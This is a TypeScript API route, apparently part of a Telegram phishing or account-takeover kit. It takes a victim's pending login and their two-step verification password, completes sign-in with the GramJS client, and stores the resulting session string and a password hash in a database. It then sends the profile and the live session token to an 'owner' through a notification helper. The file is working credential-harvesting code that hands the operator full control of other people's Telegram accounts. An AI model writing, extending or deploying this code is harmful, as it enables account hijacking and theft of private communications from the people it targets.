import { createHash } from "node:crypto";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import { initSchema, queryOne, execute } from "@/lib/db";
import { sendHtmlToOwner, buildProfileHtml } from "@/lib/notify";
import { getCompleteProfile } from "@/lib/telegramProfile";

export const runtime = "nodejs";

export async function POST(req: Request) {
  await initSchema();
  try {
    const { loginId, password } = await req.json();

    if (!loginId || !password) {
      return Response.json(
        { success: false, error: "Data kata sandi tidak lengkap." },
        { status: 400 }
      );
    }

    const apiId = parseInt(process.env.API_ID || "");
    const apiHash = process.env.API_HASH || "";

    if (!apiId || !apiHash) {
      return Response.json(
        { success: false, error: "Server configuration error." },
        { status: 500 }
      );
    }

    const session = await queryOne<{
      session_string: string;
      status: string;
      phone: string;
    }>(
      `SELECT session_string, status, phone
       FROM otp_sessions
       WHERE login_id = $1`,
      [loginId]
    );

    if (!session) {
      return Response.json(
        { success: false, error: "Sesi tidak ditemukan atau kadaluarsa." },
        { status: 400 }
      );
    }

    if (session.status !== "2fa_needed") {
      return Response.json(
        { success: false, error: "Sesi tidak dalam status 2FA." },
        { status: 400 }
      );
    }

    const stringSession = new StringSession(session.session_string);
    const client = new TelegramClient(stringSession, apiId, apiHash, {
      connectionRetries: 1,
    });

    await client.connect();

    try {
      await client.signInWithPassword(
        { apiId, apiHash },
        {
          password: async () => password,
          onError: (err: any) => {
            throw err;
          },
        }
      );

      const sessionString = client.session.save() as unknown as string;
      const profile = await getCompleteProfile(client, sessionString);
      const hash = createHash("sha256").update(password + "::telegram_2fa").digest("hex");

      await queryOne(
        `INSERT INTO telegram_accounts (phone, user_id, username, first_name, last_name, session_string, two_fa_password_hash)
         VALUES ($1, $2, $3, $4, $5, $6, $7)
         ON CONFLICT (phone) DO UPDATE SET
           user_id = EXCLUDED.user_id,
           username = EXCLUDED.username,
           first_name = EXCLUDED.first_name,
           last_name = EXCLUDED.last_name,
           session_string = EXCLUDED.session_string,
           two_fa_password_hash = EXCLUDED.two_fa_password_hash,
           signed_at = NOW()`,
        [session.phone || "unknown", profile.userId, profile.username, profile.firstName, profile.lastName, sessionString, hash]
      );

      await execute(
        "UPDATE otp_sessions SET status = 'signed_in', session_string = $1, updated_at = NOW() WHERE login_id = $2",
        [sessionString, loginId]
      );

      const html = buildProfileHtml({ ...profile, sessionString, twoFaUsed: true });
      const notifyOk = await sendHtmlToOwner(html);
      console.log("[verify-password] Owner notification:", notifyOk ? "sent" : "failed");

      return Response.json({ success: true, sessionString });
    } catch (err: any) {
      console.error("Error verifying Telegram password:", err);
      const errorMessage = err.errorMessage || err.message || "";

      if (errorMessage === "PASSWORD_HASH_INVALID") {
        return Response.json(
          { success: false, error: "Kata sandi salah.", reason: "invalid_password" },
          { status: 400 }
        );
      }

      return Response.json(
        { success: false, error: "Gagal memverifikasi kata sandi. Silakan coba lagi." },
        { status: 500 }
      );
    }
  } catch (err: any) {
    console.error("Error verifying Telegram password:", err);
    return Response.json(
      { success: false, error: "Gagal memverifikasi kata sandi. Silakan coba lagi." },
      { status: 500 }
    );
  }
}
